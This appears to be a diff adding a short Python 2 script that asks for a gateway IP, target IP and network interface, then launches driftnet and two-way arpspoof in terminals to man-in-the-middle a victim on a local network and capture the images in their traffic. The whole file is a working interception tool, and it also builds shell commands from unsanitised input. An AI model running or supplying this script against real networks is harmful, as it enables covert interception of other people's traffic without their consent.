@@ -1,0 +1,20 @@
+import os
+import time
+import termcolor
+
+def drift():
+    global gateway
+    gateway = raw_input("Gateway IP > ")
+    time.sleep(0.5)
+    global target
+    target = raw_input("Target IP > ")
+    time.sleep(0.5)
+    global inter
+    inter = raw_input("Interface > ")
+drift()
+
+os.system("""gnome-terminal -e  'bash -c "driftnet -i {inter}" ' """.format(inter=inter))
+
+os.system("""gnome-terminal -e 'bash -c "arpspoof -i {inter} -t {target} {gateway}" ' """.format(inter=inter, target=target, gateway=gateway))
+
+os.system("arpspoof -i " + inter + " -t " + gateway + " " + target)
